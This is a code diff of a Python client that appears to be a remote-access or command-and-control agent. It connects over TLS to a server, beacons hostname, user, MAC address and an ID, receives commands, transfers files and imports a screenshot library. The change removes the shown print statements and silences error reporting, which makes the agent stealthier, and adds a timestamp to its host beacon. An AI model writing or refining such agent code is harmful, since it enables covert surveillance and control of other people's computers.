@@ -1,5 +1,5 @@
 import socket, ssl, threading, sys, os, subprocess
-import secrets, platform, uuid
+import secrets, platform, uuid, datetime
 import shutil, hashlib, mss, mss.tools
 from getpass import getuser
 if platform.system() == "Windows":
@@ -38,7 +38,6 @@ class Client:
         self.secure_sock = context.wrap_socket(sock, server_hostname=self.server_address)
         
         try:
-            print(f"Connecting to {self.server_address}:{self.server_port}...")
             self.secure_sock.connect((self.server_address, self.server_port))
 
             information_json = self.getJSONHostInfos()
@@ -47,9 +46,9 @@ class Client:
             self.receive_commands()
 
         except ssl.SSLError as e:
-            print(f"SSL error: {e}")
+            pass
         except Exception as e:
-            print(f"Error: {e}")
+            pass
         finally:
             self.secure_sock.close()
 
@@ -120,7 +119,6 @@ class Client:
                     if (data == SIG_EOF) or (not data):
                         break
                     if (decoded_data.startswith("ERROR:")):
-                        print(decoded_data)
                         os.remove(file)
                         return
                     f.write(data)
@@ -128,7 +126,7 @@ class Client:
             return
     
     def getJSONHostInfos(self):        
-        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\"}}"
+        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\", \"timestamp\": \"{datetime.datetime.now()}\"}}"
 
     def getClientUID(self):
         """Create a UID combining the hostname the mac address and the user running the agent"""
